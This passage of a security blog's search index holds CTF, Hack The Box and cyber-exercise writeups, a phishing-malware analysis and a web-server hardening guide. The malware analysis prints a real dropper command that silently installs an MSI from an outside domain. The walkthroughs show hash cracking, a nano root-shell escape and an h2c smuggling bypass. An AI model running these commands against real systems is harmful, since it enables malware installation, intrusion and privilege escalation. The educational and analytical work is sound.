transfers nên để xác định được các gói tin liên quan mình dùng lệnh usb.transfer_type == 0x01 trong Wireshark để filter gói tin. Vì bàn phím là thiết bị có tốc độ thấp nên dữ liệu sẽ luôn ở dạng 8 bytes xx:xx:xx:xx:xx:xx:xx:xx.Thông thường thông tin của thiết bị sẽ được ghi trong các gói tin GET DESCRIPTOR Request/Response DEVICE tuy nhiên những gói tin này nằm ngoài phạm vi của bài viết nên mình sẽ không đề cập đến mà chỉ tập trung vào cách lấy dữ liệu từ pcap/pcapng.Trong hình trên ta thấy ở gói tin số 1 có thông tin 00:00:09:00:00:00:00:00, với 09 tương ứng với chữ f trên bàn phím. Tại sao lại như vậy? Đó là do thống nhất giữa máy tính và bàn phím, thông tin về mã hex tương ứng với từng bàn phím, các bạn có thể tham khảo tại đây: https://usb.org/sites/default/files/documents/hut1_12v2.pdf trang 53.Tuy nhiên chú ý thì gói tin số 10, lại có 02 đứng đầu, vậy nó khác gì so với gói tin 01 có bytes đầu là 00?Đó là khi người dùng đè shift + something. Trong trường hợp trên 2F tương ứng với dấu [ nhưng vì đè shift đằng trước nên kí tự đúng sẽ là {.Vậy tất cả các bàn phím đều giống nhau? Câu trả lời là không. Mỗi quốc gia sử dụng những ngôn ngữ, kiểu chữ khác nhau sẽ có những mã hex tương ứng với từng kí tự của ngôn ngữ đó. Ví dụ như crush 7 năm của mình là người rất thích, và là chuyên gia tiếng Nhật nên mình tìm hiểu thì ra được bảng này: http://hp.vector.co.jp/authors/VA003720/lpproj/others/kbdjpn.htm. Đây là trang web so sánh sự khác, giống nhau của bàn phím tiếng Nhật với bàn phím theo chuẩn quốc tế mà chúng ta hay thường sử dụng.Có bạn sẽ thắc mắc vậy bàn phím của Việt Nam thì sao? Mình xin trả lời việc chúng ta đánh máy bằng Telex hay VNI để ghi tiếng Việt có dấu là xử lý ở mức độ application, không liên quan đến việc input data từ bàn phím. Dù bạn gõ tiếng Việt nhưng nếu thử capture bằng Wireshark thì chắc chắn gói tin bạn nhận được vẫn sẽ theo dạng kí tự nhập vào. Ví dụ mình gõ VNI chào thì khi capture và xuất dữ liệu, kết quả chúng ta nhận được là chao2.8 bytes dữ liệu này sẽ luôn xuất hiện dưới 1 trong 2 trường là: Leftover Capture data hoặc HID Data tại thông tin của mỗi gói tin; sự khác biệt này hiện tại mình chưa tìm ra nguyên nhân, nên khi xem xét một gói tin mình luôn làm theo flow và theo dõi data trong đó để xác định.Xuất kết quảChúng ta không thể cứ đọc từng line và so sánh từng dòng code với từng mã hex trong bảng được. Vì vậy cách nhanh nhất là xuất bằng command line. Mình thường sử dụng tshark để xuất thông tin sau đó decode.Câu lệnh tshark:$ tshark -r ./usb.pcap -Y 'usb.capdata &amp;&amp; usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&amp;/g2'Ở một số phiên bản sẽ in sẵn dấu : cho từng bytes thì các bạn có thể xóa lệnh pipe sed.Tiếp theo, mình decode những mã hex vừa được output.EzPz.Một số thử thách CTF liên quan đến vấn đề này các bạn có thể thử là:- PicoCTF 2017_Just Keyp Trying- IceCTF2016- Bsidesf CTF_The Key.Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Writeup] Diễn tập ATTT Ngân hàng Nhà Nước 31/03/2021", "url": "/posts/Writeup-Dien-tap-ATTT-NHNN-03-2021/", "categories": "Writeup", "tags": "writeup", "date": "2021-03-31 00:00:00 +0700", "snippet": "0x01: Ứng cứu sự cố, điều tra số1. Time2AttackTrong bài này, ban tổ chức (BTC) cung cấp 1 file pcap. Sau khi mở bằng wireshark ta có 1 file zip với tên time.zip. Nhận thấy đây là 1 file zip yêu cầu...", "content": "0x01: Ứng cứu sự cố, điều tra số1. Time2AttackTrong bài này, ban tổ chức (BTC) cung cấp 1 file pcap. Sau khi mở bằng wireshark ta có 1 file zip với tên time.zip. Nhận thấy đây là 1 file zip yêu cầu password để mở đồng thời thông tin trước đó BTC yêu cầu tool bruce force nên mình sử dụng john the ripper để dò password xem sao.$ zip2john time.zip &gt; time.hash$ john --wordlist=rockyou.txt -format:zip time.hashVà mình có được password là !@#$%. Tiếp đến, trong file zip là một file text với nội dung gần như là mã base64, nhìn lại file text có tên là rot-me, vậy có thể là sự xáo trộn của 2 mã này, dùng CyberChef decrypt theo flow: data -&gt; rot13 -&gt; base64 -&gt; image, mình get được ảnh có chứa flag2. MeowĐề bài yêu cầu tìm thời gian mà user meow được tạo ra theo log event của Windows. Ban đầu mình sử dụng tìm kiếm theo event ID tạo user là 4720 nhưng không tìm thấy event nào, cũng lúc ấy một người anh trong team nói log AD server, ngẫm lại thì 4720 là log của máy local, nếu dùng AD thì sẽ không thể có log 4720 được nên mình dùng chức năng tìm kiếm mình có tìm thấy 2 event tạo user thông qua 2 tiến trình net.exe và net1.exe. Search google thì 2 tiến trình này là gần giống nhau trong đó lệnh net.exe đã được sửa để vá lỗi Y2K (sự cố máy tính năm 2000) và net1.exe là phiên bản cũ hơn để sử dụng tính tương thích ngược. Và cũng không xác định được time nào chính xác hơn mà BTC cho 10 lần submit nên mình submit cả 2 và đáp án là time đã call net1.exeFlag: ATTT{24/03/2021-09:28:18}3. Who let the cats in?Sử dụng đáp án của câu trên, mình có được event đã tạo user từ đó lấy được Logon ID:\t0x175CBA, trace back Logon ID này với time kết nối gần nhất.Flag: ATTT{192.168.95.133-50921}5. Command Sharing PointNgay khi nhận được file pcap, nhận thấy trong các gói tin có chứa shellcode, nên mình export toàn bộ file cũng như xem số thứ tự packet. Đầu tiên có IP: 10.3.1.65 truy cập và thực hiện command trên server và exploit 2 user là hro1 cùng sp_farm.Nhưng khi nhìn lại tại gói streams 749 đã cho mình thấy rằng đã tồn tại file reverse_shell.txt. Vậy có thể trên máy đã bị exploit từ trước đó và IP 10.3.1.65 là địa chỉ C2. Sau một thời gian tìm kiếm đồng đội mình có tìm thấy tại streams 340 có lệnh tạo user và stream 1233 có tải shell từ IP 10.3.1.65.Ngoài ra khi nhìn thấy payload, google search ra được CVE-2020-1181. Và các session để exploit sử dụng login là user hr01, việc còn lại là xác định IP, ban đầu team mình nghĩ là IP 192.168.95.130 vì đây là IP thực hiện exploit, tuy nhiên theo đáp án của BTC thì IP đúng cho flag là IP C2: 10.3.1.65.Flag: ATTT{CVE-2020-1181/hr01/10.3.1.65}6. Am I qualified to be your hacker?Bài này BTC cung cấp file save của Process Monitor, quan sát Process Tree, ta thấy tiến trình EQNEDT32.EXE đang call tiến trình con là powershell và cmd, nhìn phát ra ngay là CVE-2017-11882.Phần còn lại là xác định file Word mà user hr01 đã mở, ta để ý time của tiến trình EQNEDT32.EXE start lúc 07:14:03, trong khoảng thời gian này chỉ có file CV-HuyTQ.doc là hoàn toàn phù hợp cho điều kiện trên.Flag: ATTT{CV-HuyTQ.doc;CVE-2017-11882}0x02: PentestVì server đã bị BTC đóng nên mình không viết chi tiết được nên chỉ nêu flow và cách thực hiện.7. Magic flag in codeBài này exploit thông qua lỗi PHP Deserialization - Phar Files.Ban đầu, tạo một shell code và lưu dưới dạng .jpg vì code chỉ check extenstion mà không check thông qua magic bytes. Tìm đến khai khác PHP Deserialization - Phar Files để từ file .jpg -&gt; file .php và đọc flag tại md5.php.Chi tiết các bạn có thể coi video của IppSec: https://www.youtube.com/watch?v=fHZKSCMWqF410. Hide and SeekBài này sau khi sử dụng dirsearch, mình nhận thấy nếu muốn truy cập admin đều sẽ bị 403, tuy nhiên tại response trả về của server, mình nhận ra server đang chạy ApacheWebser tại port 8000 và dùng Nginx làm Reverse proxy. Loay hoay cách bypass theo dạng HttpSmugling thì đồng đội mình có dùng hint và thu về h2c. Kết hợp lại google mình thu về được: https://github.com/BishopFox/h2csmuggler./h2csmuggler.py -x https://link.challenge http://localhost/adminCảm ơn BTC!Cheer (☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)" }, { "title": "[Writeup] Hack The Box - Open Admin", "url": "/posts/Hack-The-Box-Open-Admin/", "categories": "Writeup, hackthebox", "tags": "hackthebox, writeup", "date": "2020-05-09 00:00:00 +0700", "snippet": "The way how I took user and root of this machine.0x01: LookingAccess the address of this machine I only can see the default index page of Apache2, so I used dirb &amp; nmap to scan and knows more a...", "content": "The way how I took user and root of this machine.0x01: LookingAccess the address of this machine I only can see the default index page of Apache2, so I used dirb &amp; nmap to scan and knows more about this machine.Dirb resultNmap resultAccess /music I see the login function, and it redirect me to /ona. 0x02: Access shellOpenNetAdminAfter googling, I found RCE vulnerability, you can download the payload here..After cat /etc/passwd, I realize I may need to use the privilege escalation technique from www-data to 2 users jimmy and joanna before taking a root.0x03: Access user 1Searching in the main folder of ona, I found the password to login one of the users in the database.$ cat local/config/database_settings.inc.phpTried on both users jimmy &amp; jonna I can logged-in with the username jimmy via ssh with its password.0x04: Access user 2Searching in the machine I found in /var/www there is a directory internal with jimmy permission.After looking at the php source code, the workflow is index.php »&gt; main.php and read the RSA key, but it can’t read because it does not have any permission.Use command netstat -natpe I realized that the php source code is running at root because the user id is 0. Because of that, I just need to access /main.php and take the RSA private key.$ curl 127.0.0.1:52846/main.php RSA private keyBut it is not the end yet, I still need to find the passphrase of this private key to access via ssh.Use john and rockyou wordlist:# python ssh2john.py joanna_pri_key &gt; joanna_pri_key.hash# john --wordlist=/root/Downloads/rockyou.txt --format=SSH joanna_pri_key.hashAnd the passphrase is: bloodninjas0x05: Access rootAt /opt , we have a one file priv and it’s permission is 352 -rw-r - r - 1 root root 0 Nov 22 23:49 privBeside that, I also used sudo -l and knew that nano can be used under root permission without password. It means that I can use GTFOBins to privilege escalation to root.$ sudo nano priv^R^Xreset; sh 1&gt;&amp;0 2&gt;&amp;0Got rootAnd tada, I got root! That is how I own the user and root of this machine. Hope you guys learned something new from this machine.Cheers! 👍P/S: Thank you GinaTU aka Tứ Diệp Thảo to help me edit this post" }, { "title": "Phân tích sơ bộ một email mã độc", "url": "/posts/phan-tich-so-bo-mot-email-ma-doc/", "categories": "Research, Malware", "tags": "malware, Research", "date": "2020-04-29 00:00:00 +0700", "snippet": "Ngày đẹp trời nắng chói chang khắp Sài Gòn vừa nhộn nhịp trở lại sau 2 tuần tự cách ly, đang nhâm nhi 1 ly the coffee house và thưởng thức 1 quyển sách thì mình nhận được mẫu email mã độc forward t...", "content": "Ngày đẹp trời nắng chói chang khắp Sài Gòn vừa nhộn nhịp trở lại sau 2 tuần tự cách ly, đang nhâm nhi 1 ly the coffee house và thưởng thức 1 quyển sách thì mình nhận được mẫu email mã độc forward từ một người bạn. Theo thói quen mình liền mở lên phân nó thử xem sao.Phân tích tĩnhSau khi tải file .EML, vì an toàn nên thay vì dùng những phần mềm chuyên đọc và mở mail như Outlook, Mail,… nên mình dùng những phần mềm đọc văn bản như Notepad++ hay sublime text mở file và nắm nội dung sơ bộ của email này.Loại bỏ nội dung của email, ta chú rằng có một tệp tin là “RFQ NEW ORDER.doc” đính kèm.Để chắc rằng file đính kèm có phải là 1 file .doc hay không hay đó là 1 file exe, mình tiến hành copy chuỗi đầu tiên trong đoạn base64 để có được “Magic bytes” của file đính kèm từ đó xác nhận đây là file gì.“Magic bytes” cho chúng ta biết đó là file RTF(Rich Text Format) một dạng file văn bản phát triển bởi Microsoft và có thể đọc bởi bất kỳ các trình soạn thảo văn bản. Nhưng mối nguy hiểm của định dạng file RTF là nó cho phép một tập tin khác nhúng vào chính nó và sau đó thực thi.Sau khi xác nhận đó là file RTF, mình tiến hành xuất file đính kèm bằng “mpack” trên Ubuntu.Sử dụng bộ công cụ Ole tools để phân tích tập tin RTF kính đèm.Ta thấy rằng rtfobj phát hiện ra 1 file nhúng bên trong file RTF, và có thể liên quan tới CVE-2017-1182 hoặc CVE-2018-0802.Để xác định rõ thêm các file nhúng bên trong file RTF, ta sử dụng rtfdumpChúng ta tiến hành dump các file này ra, để ý thì MD5 của obj thứ 171 và 172 là giống nhau vậy 2 file này là giống nhau nên chỉ cần dump 1 file để phân tích.Như hình trên ta có thể thấy khi mở mẫu, thì sẽ thực thi một command đó là:Cmd.exe &amp; /C CD C: &amp; msiexec.exe /I https://www.soygorrion.com.ar/ii/solstraalehi.msi/quietCâu lệnh này tương ứng với windows sẽ cái đặt file solstraalehi.msi sau khi download và chạy ẩn tiến trình, điều này sẽ làm user không biết được rằng máy mình đang bị cài đặt một chương trình lạ vào máy. Tuy nhiên cũng không loại trừ khả năng đây là attacker cố ý làm rõ.Phân tích độngTiến hành phân tích động, sau khi mở file Microsoft Word sẽ gọi tiến trình EQNEDT32.exe để xử lý các OLE của file RTF, ta thấy rằng tiến trình EQNEDT32.exe sẽ thực thi câu lệnh và cài đặt góiVậy sau khi thực thi, tiến trình sẽ thực hiện cài đặt gói đã được định sẵn.Tuy nhiên lúc thực hiện bài phân tích, domain này đã gỡ bỏ file .msi của mã độc, từ đó không thể tải về file này để phân tích các bước tiếp theo mà mã độc sẽ thực hiện.Happy holidays!" }, { "title": "[Writeup] Hack The Box - Traverxec", "url": "/posts/Hack-The-Box-Traverxec/", "categories": "Writeup, hackthebox", "tags": "hackthebox, writeup", "date": "2020-04-28 00:00:00 +0700", "snippet": "The way how I solved Traverxec machine.0x01: Access shellThe first step I always do is using Nmap to scan for open port(s) and service(s):$ nmap -sV -sT -sC 10.10.10.165And the output is:Let’s chec...", "content": "The way how I solved Traverxec machine.0x01: Access shellThe first step I always do is using Nmap to scan for open port(s) and service(s):$ nmap -sV -sT -sC 10.10.10.165And the output is:Let’s check the website:After checking and taking a look around the website, I realized this is just a static website. Then I googled for nostromo 1.9.6 exploitation, and got RCE vuln at this version. You can use the exploit payload at exploit-db. And let’s access bash:0x02: Access userNormally, source code of a website is usually saved at /var directory, I checked with ls command and got the nostromo folder. Going to the conf folder, I found nhttpd.conf.And I think a lot of people will be stuck at this step like me. That is reading .htpasswd then decode it and use it like a ssh password.But read carefully once again, I realize the homedirs is /homeAnd ls at /home only has a david folder. With .htpasswd above, I think maybe public_www folder can exist inside the david folder.$ cd /home/david/public_wwwAnd yes, it’s worked:Let’s open protected-file-area folderWe have a .tgz file, but can’t extract it because we can only read it. Ok, let’s read it by zcat: Got private_key, let’s find the passphrase with john.$ python ssh2john.py david_key &gt; david_key.hash$ john --wordlist=/root/Downloads/rockyou.txt --format=SSH david_key.hashAnd the passphrase is: hunter0x03: Access rootIn /home/david/bin folder, we have 2 files:Let’s read server-stats.sh:I easily realize that journalctl is running at root.Looking at GTFOBins,journalctl can used to escalate privileges attack if it’s running at root.The way to trick is make terminal smaller and type !/bin/sh:Tada!So that concluded how I solved the machine. Hope that you learned something new with this writeup.Cheers! 👍P/S: Thank you GinaTU aka Tứ Diệp Thảo to help me edit this post" }, { "title": "[Writeup] Hexion CTF 2020", "url": "/posts/Hexion-CTF-2020/", "categories": "Writeup, HexionCTF2020", "tags": "forensics, writeup, HexionCTF", "date": "2020-04-13 00:00:00 +0700", "snippet": "MirateIn this challenge, we will see the flag after being encrypted; when we type some words to the text box, we will receive the encrypted words corresponding with our input words.And here is my c...", "content": "MirateIn this challenge, we will see the flag after being encrypted; when we type some words to the text box, we will receive the encrypted words corresponding with our input words.And here is my cover:Flag: hexCTF{Don7_judge_a_B0Ok_by_1ts_c0v3r}T&amp;JIn this challenge we receive the pcap file, after opening the file in Wireshark, it’s a USB capture pcap.Look at the leftover captured data, it only shows 4 bytes hex strings. Therefore, I realized there is a possibility that it can be a mouse capture, and the challenge’s description helped to ensure this idea more definitely. Can you help Tom catch Jerry?Luckily, I did some research about USB capture (keyboard and mouse) before, so I know what action to take next. You can read this writeup of rootusers to know more detail.First, I extracted USB data capture by tshark:# tshark -r jerry.pcapng -T fields -e usb.capdata &gt; 1.txt# tail -n 10 1.txt0000ff000000ffff00ff0000ffff00000000ff000000ffff0000ff000000ffff00ff0000ffff000000ff0000ffff000000ff0000ffff000000ff0000ffff000001000000000000000000000000000000For some reasons I do not know why my data lost : so I added it# tail -n 10 2.txt 00:00:ff:00:00:00:ff:ff00:ff:00:00:ff:ff:00:0000:00:ff:00:00:00:ff:ff00:00:ff:00:00:00:ff:ff00:ff:00:00:ff:ff:00:0000:ff:00:00:ff:ff:00:0000:ff:00:00:ff:ff:00:0000:ff:00:00:ff:ff:00:0001:00:00:00:00:00:00:0000:00:00:00:00:00:00:00Next I change it to the coordinates# awk -F: 'function comp(v){if(v&gt;127)v-=256;return v}{x+=comp(strtonum(\"0x\"$2));y+=comp(strtonum(\"0x\"$3))}$1==\"01\"{print x,y}' 2.txt &gt; 3.txt# tail -n 10 data3.txt 1928 2641928 2651927 2651927 2661926 2661925 2661924 2661923 2661922 266-1701 29After got the coordinates, I plot it into Gnuplot.# gnuplot\tG N U P L O T\tVersion 5.2 patchlevel 8 last modified 2019-12-01 \tCopyright (C) 1986-1993, 1998, 2004, 2007-2019\tThomas Williams, Colin Kelley and many others\tgnuplot home: http://www.gnuplot.info\tfaq, bugs, etc: type \"help FAQ\"\timmediate help: type \"help\" (plot window: hit 'h')Terminal type is now 'qt'gnuplot&gt; plot '3.txt'And here is itFlag: hexCTF{y3t_an0th3r_pc4p_ch4ll3nge}P/S: Thank you GinaTU aka Tứ Diệp Thảo to help me edit this post" }, { "title": "Set up website with apache webserver and nginx waf reverse proxy", "url": "/posts/setup-a-website-with-apache-webserver-and-nginx-waf-reverse-proxy/", "categories": "Research", "tags": "nginx, forensics, apache, webserver, system, waf", "date": "2020-04-03 00:00:00 +0700", "snippet": "When I started thinking about running my site on my own server instead of using Blogger or Medium, etc… And after tried to use Apache, Nginx,… I realized that combining Apache and Nginx could be th...", "content": "When I started thinking about running my site on my own server instead of using Blogger or Medium, etc… And after tried to use Apache, Nginx,… I realized that combining Apache and Nginx could be the best choice for me, because I want to use .htaccess of Apache and speed of Nginx. There come my architecture:In this post, I will use private IP range for Nginx reverse proxy server and Apache web server. Both of them are running Ubuntu 18.04 LTS. Apache webserver: \t10.128.0.2 Nginx reverse proxy: \t10.128.0.3 1. Install and configure Apache web serverInstall apache webserver:$ sudo apt install apache2Next we create a place where to storage source code:$ sudo mkdir -p /var/www/html/example.com/public_htmlChange permission:$ sudo chown -R &lt;user&gt;:&lt;group&gt; /var/www/html/example.com/public_html$ sudo chmod -R 744 /var/www/html/example.com/public_htmlWith user and *group you can use command$ apachectl -SUsually, it’s www-dataNow let’s config virutal host and port:$ sudo vim /etc/apache2/ports.confListen 8080&lt;IfModule ssl_module&gt; Listen 443&lt;/IfModule&gt;&lt;IfModule mod_gnutls.c&gt; Listen 443&lt;/IfModule&gt;$ sudo cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/example.com.conf$ sudo vim /etc/apache2/sites-available/example.com.conf&lt;VirtualHost 10.128.0.2:8080&gt; ServerAdmin webmaster@example.com DocumentRoot /var/www/html/example.com/public_html/ ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined ErrorDocument 404 /404.html&lt;/VirtualHost&gt;Active your website:$ sudo a2dissite 000-default.conf$ sudo a2ensite example.com.conf2. Install and configure Nginx2.1 Install Nginx packageInstall the prerequisites:$ sudo apt install curl gnupg2 ca-certificates lsb-releaseAdd repository for stable nginx packages:$ echo \"deb http://nginx.org/packages/ubuntu `lsb_release -cs` nginx\" \\ | sudo tee /etc/apt/sources.list.d/nginx.listImport an official nginx signing key so apt could verify the packages authenticity:$ curl -fsSL https://nginx.org/keys/nginx_signing.key | sudo apt-key add -Verify that you now have the proper key:$ sudo apt-key fingerprint ABF5BD827BD9BF62The output should contain the full fingerprint 573B FD6B 3D8F BC64 1079 A6AB ABF5 BD82 7BD9 BF62 as follows:pub rsa2048 2011-08-19 [SC] [expires: 2024-06-14] 573B FD6B 3D8F BC64 1079 A6AB ABF5 BD82 7BD9 BF62uid [ unknown] nginx signing key &lt;signing-key@nginx.com&gt;Finally, install Nginx:$ sudo apt update$ sudo apt install nginx2.2 Configure Nginx reverse proxy$ sudo cp /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/example.com.conf$ sudo vim /etc/nginx/conf.d/example.com.confserver { listen 80; server_name example.com;\tport_in_redirect off; location / { proxy_redirect off; proxy_set_header Host $host:$server_port; proxy_set_header X-Forwarded-Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://10.128.0.2:8080; } location ~ /\\.ht { deny all; }}2.3 Install and configure ModsecurityInstall the prerequisites:$ sudo apt-get install -y apt-utils autoconf automake build-essential git libcurl4-openssl-dev libgeoip-dev liblmdb-dev libpcre++-dev libtool libxml2-dev libyajl-dev pkgconf wget zlib1g-devDownload Modsecurity source:$ git clone --depth 1 -b v3/master --single-branch https://github.com/SpiderLabs/ModSecurityCompile Modsecurity:$ cd ModSecurity$ git submodule init$ git submodule update$ ./build.sh$ ./configure$ make$ sudo make installIf you see this notification on your terminal, just ignore it and take a coffee because the process might take about 15 minutes to complete. fatal: No names found, cannot describe anything.2.4 Download the NGINX Connector for ModSecurity and Compile It as a Dynamic Module$ git clone --depth 1 https://github.com/SpiderLabs/ModSecurity-nginx.gitCheck your nginx version:$ nginx -vnginx version: nginx/1.17.9Download source code:$ wget http://nginx.org/download/nginx-1.17.9.tar.gz$ tar -xvzf nginx-1.17.9.tar.gz$ cd nginx-1.17.9$ ./configure --with-compat --add-dynamic-module=../ModSecurity-nginx$ make modules$ sudo cp objs/ngx_http_modsecurity_module.so /etc/nginx/modules/Load Nginx Modsecurity Connector by add the load_module following to the top of /etc/nginx/nginx.conf load_module modules/ngx_http_modsecurity_module.so;Configure and Enable Modsecurity:$ sudo mkdir /etc/nginx/modsec$ sudo wget -P /etc/nginx/modsec/ https://raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended$ sudo mv /etc/nginx/modsec/modsecurity.conf-recommended /etc/nginx/modsec/modsecurity.confActive dropping malicious mode:$ sudo sed -i 's/SecRuleEngine DetectionOnly/SecRuleEngine On/' /etc/nginx/modsec/modsecurity.confAdd modsecurity rule and config your test rule:$ sudo vim /etc/nginx/modsec/main.confInclude \"/etc/nginx/modsec/modsecurity.conf\"# Basic test ruleSecRule ARGS:testparam \"@contains test\" \"id:1234,deny,status:403\"Then turn on the modsecurity in your server config:$ sudo vim /etc/nginx/conf.d/example.com.confserver { # ... modsecurity on; modsecurity_rules_file /etc/nginx/modsec/main.conf;}Check everything ok yet by command:$ sudo nginx -tIf the output are:nginx: the configuration file /etc/nginx/nginx.conf syntax is oknginx: configuration file /etc/nginx/nginx.conf test is successfulWe completed 99%, if there is an error about unicode.mapping, you can fix it by the following commands:$ cd /path/to/Modsecurity$ sudo cp unicode.mapping /etc/nginx/modsec/Check if the waf is active or not by curl. The 403 status confirmed that the rule worked:$ curl example.com/?testparam=test&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\"white\"&gt;&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;&lt;hr&gt;&lt;center&gt;nginx/1.17.9&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;This is the basic configuration, if you have any problem, just let me know and I will help you!Cheers!P/S: Thank you GinaTU aka Tứ Diệp Thảo to help me edit this post" }, { "title": "[Writeup] BSidesSF 2019 CTF", "url": "/posts/Writeup-BSidesSF-2019-CTF/", "categories": "Writeup, 2019", "tags": "BSidesSF, writeup", "date": "2019-05-03 00:00:00 +0700", "snippet": "table-tennisSử dụng wireshark, mình thấy có khá nhiều certificate, tuy nhiên nhưng chứng chỉ này không làm được gì cả. Và số lượng gói tin cũng khá nhiều nên mình vào Statistics -&gt; Conversations...", "content": "table-tennisSử dụng wireshark, mình thấy có khá nhiều certificate, tuy nhiên nhưng chứng chỉ này không làm được gì cả. Và số lượng gói tin cũng khá nhiều nên mình vào Statistics -&gt; Conversations để xem các kết nối.Sau khi filter các kết nối của mạng 172.217.5.100 và 172.217.0.36 mình thấy rằng đó là các gói tin ICMP, request và reply data có đều có chứa mã base64, vì không rành về thư viện scappy lắm và một phần là chuỗi cũng khá ngắn nên mình quyết định là làm bằng tay.Và chỉ sau chừng 5 phút mình đã có được đoạn base64 hoàn chỉnh: Q1RGe0p1c3RBMHV0UDFuUzBuZ0FiZ1Awbmd9Flag: CTF{JustA0utP1nS0ngAbgP0ng}goodlusk1Ban tổ chức cho mình một file img nên mình dùng Autospy để mở. Bên trong chứa một file LUKS và không có gì khác nên mình extract file đó ra. Google cho mình biết đó là file ổ đĩa đã bị mã hóa của hệ điều hành Linux nên mình coppy vào máy ảo Linux để thực hiện.$ sudo cryptsetup open --type luks b.luks testVà dĩ nhiên vì là file đã mã hóa nên mình cần 1 password. File ảnh kèm theo cho chúng ta gợi ý về password và sau khi search tung google và nhìn thật kỹ vào bức anh, mình đã tìm ra đó là EFF passphrase. Để so khớp với các số đã cho mình dùng link này để có được password. Password làwages upturned flogging rinse landmass numberSau khi có được password mount ỗ đĩa và mình có được flag.Flag: CTF{Look_Under_Keyboards_4_Secrets}thekeyMột file pcap bắt gói tin bàn phím nhập vào, một dạng khá phổ biến. Về tài liệu các bạn có thể tham khảo tại đây. Trong file pcap ở cột left over data sẽ cho chúng ta biết được mã hex của ký tự đươc nhập vào sau đó so sánh trong bảng ký tự của tài liệu mà mình để ở trên để decode ra được phím nào đã được nhập.Tuy nhiên scappy có hỗ trợ cho nên mình dùng scappy. Source code:#!/usr/bin/pythonfrom scapy.all import * KEY_CODES = {4:\"A\",5:\"B\",6:\"C\",7:\"D\",8:\"E\",9:\"F\",10:\"G\",11:\"H\",12:\"I\",13:\"J\",14:\"K\",15:\"L\",16:\"M\",17:\"N\",18:\"O\",19:\"P\",20:\"Q\",21:\"R\",22:\"S\",23:\"T\",24:\"U\",25:\"V\",26:\"W\",27:\"X\",28:\"Y\",29:\"Z\",30:\"1\",31:\"2\",32:\"3\",33:\"4\",34:\"5\",35:\"6\",36:\"7\",37:\"8\",38:\"9\",39:\"0\",40:\"\\n\",44:\" \",45:\"_\",46:\"=\",47:\"{\",48:\"}\",49:\"|\",} pkts = rdpcap(\"thekey.pcapng\")msg= \"\"for packet in pkts: global msg hid_report = packet.load[-8:] key_code = ord(hid_report[2]) ch = KEY_CODES.get(key_code, False) if ch: msg += ch print msgSau khi decrypt mình nhận được một chuỗi khá lạ đó là: MC3AVIIM FLAAGTTXTITTHE FLAAG IS CTFVBUUA{{MY_FAVORITTE_EDITOR_IS_VIM}HHHHHHHHHHHHHHHHHHHAUVI{UWQ`Hm, mình stuck ở đoạn này vì có thể tác giả làm gì đó liên quan tới vim, tuy nhiên để ý lại thì tất cả đều clear nhưng chữ FAVORITTE lại sai chính tả nên mình sửa lại và submit thử sem sao. Ngạc nhiên là nó lại đúng và có 100 điểm.Flag: CTF{MY_FAVOURITE_EDITOR_IS_VIM}bWF0cnlvc2hr YQ==Đề bài cho mình file .eml nên mình dùng EML Reader trong Microsoft Store để mở nó. Trong file đính kèm mình có 2 file là hack.pgp và Matry_Oshka.key, bên cạnh đó đồng đội mình sử dụng notepad cũng có thấy một đoạn base64 và khi decrypt thì ra một ảnh qr code có nội dung h4ck_the_plan3t.Sử dụng gpg trong linux để decrypt:$ gpg --import Matry_Oshka.keygpg: key 69D5F0038A289FB1: public key \"Matry Oshka &lt;Matry.Oshka@gmail.com&gt;\" importedgpg: key 69D5F0038A289FB1: secret key importedgpg: Total number processed: 1gpg: imported: 1gpg: secret keys read: 1gpg: secret keys imported: 1$ gpg --list-keypub rsa2048 2019-03-01 [SC] [expires: 2021-02-28] 0C7BCBBADF0C5273E797318069D5F0038A289FB1uid [ unknown] Matry Oshka &lt;Matry.Oshka@gmail.com&gt;sub rsa2048 2019-03-01 [E] [expires: 2021-02-28]$ gpg -o out --decrypt hack.pgp gpg: encrypted with 2048-bit RSA key, ID E5CAE1F0A16B0E7A, created 2019-03-01 \"Matry Oshka &lt;Matry.Oshka@gmail.com&gt;\"Check thử xem thì file out là file zip$ file outout: Zip archive data, at least v2.0 to extractSau khi extract file zip và dùng binwalk, mình thấy có một file lzip ở offset thứ 10, tiến hành dump file và giải nén mình có được một file pdf chứa ảnh nền windows xp huyền thoại. Sau khi dùng adobe acrobat, mình extract được file ảnh ra ngoài. Đoạn này khá là tiếc khi trong cuộc thi mình chỉ extract file jpg nên stuck và không thể giải quyết được lúc giải diễn ra. Chỉ hôm sau mình extract bằng file bitmap thì mới có thể làm đúng hướng khi admin nói mình nên tra wiki ảnh gốc. Dùng stegsolve mình có được 1 mã qr lỗi.Sau khi sửa lại bằng cách đổi pixel trắng thành đen và ngược lại, mình có được một mã qr hoàn hảo.Và mình có được đoạn base64: /Td6WFoAAATm1rRGAgAhARwAAAAQz1jM4ELCAORdABhgwwZfNTLh1bKR4pwkkcJw0DSEZd2BcWATAJkrMgnKT8nBgYQaCPtrzORiOeUVq7DDoe9feCLt9PG-MT9ZCLwmtpdfvW0n17pie8v0h7RS4dO/yb7JHn7sFqYYnDWZere/6BI3AiyraCtQ6qZmYZnHemfLVXmCXHan5fN6IiJL7uJdoJBZC3Rb1hiH1MdlFQ/1uOwaoglBdswAGo99HbOhsSFS5gGqo6WQ2dzK3E7NcYP2YIQxS9BGibr4Qulc6e5CaCHAZ4pAhfLVTYoN5R7l/cWvU3mLOSPUkELK6StPUBd0AABBU17Cf970JQABgALDhQEApzo4PbHEZ/sCAAAAAARZWg==Decode mình có được một file 7zip và bên trong là một file text chứa mã nhị phân. Decode mã nhị phân theo các bước: Nhị phân -&gt; ascii, mình có được dãy số Bát phân -&gt; thập phân Thập phân -&gt; ascii có đươc mã hex Từ hex -&gt; base 64 Tử base 64 -&gt; base 85 Từ base 85 -&gt; flagZippyFile pcap cho mình biết được câu lệnh unzip file 